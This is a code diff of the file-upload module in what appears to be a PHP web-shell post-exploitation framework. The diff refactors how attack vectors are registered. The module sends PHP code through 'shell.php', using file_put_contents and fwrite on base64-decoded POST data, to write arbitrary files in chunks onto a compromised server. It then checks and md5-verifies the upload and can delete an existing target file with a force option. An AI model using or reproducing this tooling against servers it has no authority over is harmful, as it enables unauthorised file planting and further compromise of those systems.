@@ -6,7 +6,6 @@ Created on 23/set/2011
 
 from core.moduleprobeall import ModuleProbeAll
 from core.moduleexception import  ModuleException, ExecutionException, ProbeException, ProbeSucceed
-from core.vector import VectorList, Vector
 from core.http.cmdrequest import CmdRequest, NoDataException
 from random import choice
 from hashlib import md5
@@ -24,24 +23,20 @@ WARN_UPLOAD_FAIL = 'Upload fail, check path and permission'
 class Upload(ModuleProbeAll):
     '''Upload binary/ascii file to the target filesystem'''
 
-    def _init_vectors(self):
-        self.vectors = VectorList([
-            Vector('shell.php', 'file_put_contents', [ "file_put_contents('$rpath', base64_decode($_POST['$post_field']), FILE_APPEND);", "-post", "{\'$post_field\' : \'$data\' }" ]),
-            Vector('shell.php', 'fwrite', [ '$h = fopen("$rpath", "a+"); fwrite($h, base64_decode($_POST["$post_field"])); fclose($h);', "-post", "{\'$post_field\' : \'$data\' }" ])
-            ])
+    def _set_vectors(self):
+        self.vectors.add_vector('file_put_contents', 'shell.php', [ "file_put_contents('$rpath', base64_decode($_POST['$post_field']), FILE_APPEND);", "-post", "{\'$post_field\' : \'$data\' }" ])
+        self.vectors.add_vector('fwrite', 'shell.php', [ '$h = fopen("$rpath", "a+"); fwrite($h, base64_decode($_POST["$post_field"])); fclose($h);', "-post", "{\'$post_field\' : \'$data\' }" ])
     
-        self.support_vectors = VectorList([
-            Vector('file.rm',  "rm", "$rpath -recursive".split(' ')),
-            Vector('file.check',  "check_exists", "$rpath exists".split(' ')),
-            Vector('file.check', 'md5', '$rpath md5'.split(' ')),
-        ])
+        self.support_vectors.add_vector("rm", 'file.rm', "$rpath -recursive".split(' '))
+        self.support_vectors.add_vector("check_exists", 'file.check', "$rpath exists".split(' '))
+        self.support_vectors.add_vector('md5', 'file.check', '$rpath md5'.split(' '))
     
-    def _init_args(self):
+    def _set_args(self):
         self.argparser.add_argument('lpath')
         self.argparser.add_argument('rpath')
         self.argparser.add_argument('-chunksize', type=int, default=1024)
         self.argparser.add_argument('-content', help=SUPPRESS)
-        self.argparser.add_argument('-vector', choices = self.vectors.get_names()),
+        self.argparser.add_argument('-vector', choices = self.vectors.keys()),
         self.argparser.add_argument('-force', action='store_true')
 
     def _load_local_file(self):
@@ -60,12 +55,13 @@ class Upload(ModuleProbeAll):
         self.args['content_chunks'] = self.__chunkify(self.args['content'], self.args['chunksize'])
         self.args['post_field'] = ''.join([choice('abcdefghijklmnopqrstuvwxyz') for i in xrange(4)])
 
-    def _check_remote_file(self):                
-        if self.support_vectors.get('check_exists').execute(self.modhandler, {'rpath' : self.args['rpath']}):
+    def _check_remote_file(self):     
+        
+        if self.support_vectors.get('check_exists').execute({'rpath' : self.args['rpath']}):
             if not self.args['force']:
                 raise ProbeException(self.name, '%s. Overwrite \'%s\' using -force option.' % (WARN_FILE_EXISTS, self.args['rpath']))
             else:
-                self.support_vectors.get('rm').execute(self.modhandler, {'rpath' : self.args['rpath']})
+                self.support_vectors.get('rm').execute({'rpath' : self.args['rpath']})
                 
     def _prepare_probe(self):
 
@@ -80,21 +76,21 @@ class Upload(ModuleProbeAll):
         for chunk in self.args['content_chunks']:
             
             args_formats = { 'rpath' : self.args['rpath'], 'post_field' : self.args['post_field'], 'data' : chunk }
-            self.current_vector.execute(self.modhandler, args_formats)  
+            self.current_vector.execute( args_formats)  
             
             i+=1
 
     def _verify_execution(self):
     
-        if self.support_vectors.get('check_exists').execute(self.modhandler, {'rpath' : self.args['rpath']}):
-            if self.support_vectors.get('md5').execute(self.modhandler, {'rpath' : self.args['rpath']}) == self.args['content_md5']:
+        if self.support_vectors.get('check_exists').execute({'rpath' : self.args['rpath']}):
+            if self.support_vectors.get('md5').execute({'rpath' : self.args['rpath']}) == self.args['content_md5']:
                 self._result = True
                 raise ProbeSucceed(self.name, 'File uploaded')
             else:
                 self.mprint('\'%s\' %s' % (self.args['rpath'], WARN_MD5_MISMATCH))
 
     def _verify_probe(self):
-        if not self.support_vectors.get('check_exists').execute(self.modhandler, {'rpath' : self.args['rpath']}):
+        if not self.support_vectors.get('check_exists').execute({'rpath' : self.args['rpath']}):
             raise ProbeException(self.name, '\'%s\' %s' % (self.args['rpath'], WARN_UPLOAD_FAIL))
 
     def __chunkify(self, file_content, chunksize):
